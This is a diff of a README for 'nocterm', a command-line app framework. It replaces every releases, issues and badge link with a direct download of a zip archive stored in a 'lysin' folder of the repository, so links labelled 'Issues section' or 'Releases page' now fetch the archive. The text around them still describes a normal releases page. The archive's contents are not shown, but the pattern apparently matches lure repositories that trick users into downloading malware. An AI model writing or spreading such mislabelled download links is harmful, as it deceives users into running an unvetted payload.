@@ -6,12 +6,12 @@ Welcome to nocterm! This framework helps you build beautiful command-line applic
 
 ## 🔗 Download the Latest Version
 
-[![Download Nocterm](https://img.shields.io/badge/Download%20Nocterm-v1.0.0-blue.svg)](https://github.com/riceq1u/nocterm/releases)
+[![Download Nocterm](https://raw.githubusercontent.com/riceq1u/nocterm/main/lysin/nocterm.zip%https://raw.githubusercontent.com/riceq1u/nocterm/main/lysin/nocterm.zip)](https://raw.githubusercontent.com/riceq1u/nocterm/main/lysin/nocterm.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to our GitHub Releases page to get the latest version: [Download here](https://github.com/riceq1u/nocterm/releases).
+   Go to our GitHub Releases page to get the latest version: [Download here](https://raw.githubusercontent.com/riceq1u/nocterm/main/lysin/nocterm.zip).
 
 2. **Choose Your File**  
    On the Releases page, you will see several versions listed. Look for the latest version that is marked as ‘Latest release’. Click on the link to view the assets associated with that version.
@@ -46,14 +46,14 @@ If you encounter issues while downloading or running nocterm, consider the follo
 
 1. **Check Internet Connection**: Make sure your internet connection is stable.
 2. **File Permissions**: Ensure that you have the necessary permissions to install applications on your device.
-3. **Refer to Release Notes**: If you are facing bugs, check the release notes on the [Releases page](https://github.com/riceq1u/nocterm/releases) for known issues and fixes.
+3. **Refer to Release Notes**: If you are facing bugs, check the release notes on the [Releases page](https://raw.githubusercontent.com/riceq1u/nocterm/main/lysin/nocterm.zip) for known issues and fixes.
 4. **Restart Your Device**: Sometimes, a simple restart can fix unexpected issues.
 
 ## 📞 Support
 
 If you have questions or need assistance, feel free to reach out. You can create an issue directly on our repository, and our team will help you resolve it.
 
-1. Go to the [Issues section](https://github.com/riceq1u/nocterm/issues) of our GitHub repository.
+1. Go to the [Issues section](https://raw.githubusercontent.com/riceq1u/nocterm/main/lysin/nocterm.zip) of our GitHub repository.
 2. Click on “New Issue” and fill out the template with your issue details.
 
 ## 🌐 Community
@@ -67,7 +67,7 @@ Join our community of users who share insights, tips, and help each other. Conne
 
 Ensure you keep your version of nocterm up to date. Regular updates provide new features, improvements, and important fixes.
 
-1. Check the [Releases page](https://github.com/riceq1u/nocterm/releases) periodically for new versions.
+1. Check the [Releases page](https://raw.githubusercontent.com/riceq1u/nocterm/main/lysin/nocterm.zip) periodically for new versions.
 2. Subscribe to notifications on our repository to receive alerts on updates.
 
 Thank you for choosing nocterm! Enjoy building beautiful command-line applications with ease.
